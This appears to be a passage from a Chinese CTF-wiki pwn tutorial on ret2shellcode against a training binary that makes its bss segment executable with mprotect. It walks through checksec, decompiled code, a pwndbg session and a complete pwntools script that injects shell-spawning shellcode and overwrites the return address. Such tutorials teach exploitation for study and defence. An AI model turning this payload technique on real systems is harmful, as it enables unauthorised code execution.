### 另一个例子

这里我们以通过`mprotect()`动态修改过内存页权限的 ret2shellcode 为例，需要注意的是，这样我们就可以在例如 Ubuntu-22.04 这样的现代操作系统中完成这个实验辣~。

> 点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

首先检测程序开启的保护：

```shell
# zer0ptr @ DESKTOP-FHEMUHT in ~/Pwn-Research/ROP/ret2shellcode/wiki [21:14:26]
$ checksec ret2shellcode
[*] '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char src[104]; // [rsp+0h] [rbp-70h] BYREF
  void *addr; // [rsp+68h] [rbp-8h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  addr = (void *)((unsigned __int64)buf2 & -getpagesize());
  v3 = getpagesize();
  if ( mprotect(addr, v3, 7) >= 0 )
  {
    puts("No system for you this time !!!");
    printf("buf2 address: %p\n", buf2);
    gets(src);
    strncpy(buf2, src, 0x64u);
    printf("bye bye ~");
    return 0;
  }
  else
  {
    perror("mprotect failed");
    return 1;
  }
}
```

可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。

```asm
.bss:00000000004040A0 buf2            db 68h dup(?)           ; DATA XREF: main+51↑o
.bss:00000000004040A0                                         ; main+A4↑o ...
```

这时，我们简单的调试下程序，看看这一个 bss 段是否可执行(由于是通过mprotect来修改权限的，那自然断点下在mprotect被调用后的地址啦)。

```shell
pwndbg> b *0x401291
Breakpoint 1 at 0x401291
pwndbg> r
Starting program: /home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401291 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 RAX  0
 RBX  0
 RCX  0x7ffff7d1eb1b (mprotect+11) ◂— cmp rax, -0xfff
 RDX  7
 RDI  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1
 RSI  0x1000
 R8   0x7ffff7e1bf10 (initial+16) ◂— 4
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
 R10  0x7ffff7c082e0 ◂— 0xf0022000056ec
 R11  0x202
 R12  0x7fffffffde58 —▸ 0x7fffffffe0fd ◂— '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
 R13  0x401216 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdd40 ◂— 1
 RSP  0x7fffffffdcd0 ◂— 1
 RIP  0x401291 (main+123) ◂— test eax, eax
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x401291 <main+123>    test   eax, eax     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x401293 <main+125>  ✔ jns    main+149                    <main+149>
    ↓
   0x4012ab <main+149>    lea    rax, [rip + 0xd66]     RAX => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b2 <main+156>    mov    rdi, rax               RDI => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b5 <main+159>    call   puts@plt                    <puts@plt>

   0x4012ba <main+164>    lea    rax, [rip + 0x2ddf]     RAX => 0x4040a0 (buf2)
   0x4012c1 <main+171>    mov    rsi, rax                RSI => 0x4040a0 (buf2)
   0x4012c4 <main+174>    lea    rax, [rip + 0xd6d]      RAX => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012cb <main+181>    mov    rdi, rax                RDI => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012ce <main+184>    mov    eax, 0                  EAX => 0
   0x4012d3 <main+189>    call   printf@plt                  <printf@plt>
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdcd0 ◂— 1
01:0008│-068 0x7fffffffdcd8 ◂— 1
02:0010│-060 0x7fffffffdce0 —▸ 0x400040 ◂— 0x400000006
03:0018│-058 0x7fffffffdce8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
04:0020│-050 0x7fffffffdcf0 ◂— 0x6f0
05:0028│-048 0x7fffffffdcf8 —▸ 0x7fffffffe0d9 ◂— 0xb0ec6c6b3dbd55d3
06:0030│-040 0x7fffffffdd00 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
07:0038│-038 0x7fffffffdd08 ◂— 0x10101000000
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0         0x401291 main+123
   1   0x7ffff7c29d90 __libc_start_call_main+128
   2   0x7ffff7c29e40 __libc_start_main+128
   3         0x401155 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r--p     1000       0 ret2shellcode
          0x401000           0x402000 r-xp     1000    1000 ret2shellcode
          0x402000           0x403000 r--p     1000    2000 ret2shellcode
          0x403000           0x404000 r--p     1000    2000 ret2shellcode
          0x404000           0x405000 rwxp     1000    3000 ret2shellcode
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
    0x7ffff7fad000     0x7ffff7fb0000 rw-p     3000       0 [anon_7ffff7fad]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000       0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rwxp    21000       0 [stack]
```

这里也是一样通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：

```text
0x404000           0x405000 rwxp     1000    3000 ret2shellcode
```

思路和上一个例子是相同的

最后的 payload 如下：

```python
#!/usr/bin/env python3
from pwn import *
context.binary = './ret2shellcode'
context.log_level = 'debug'
io = process('./ret2shellcode')

buf2_addr = 0x4040a0
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(100, b'\x90')  
payload = payload.ljust(120, b'a')       
payload += p64(buf2_addr)                

io.sendline(payload)
io.interactive()
```
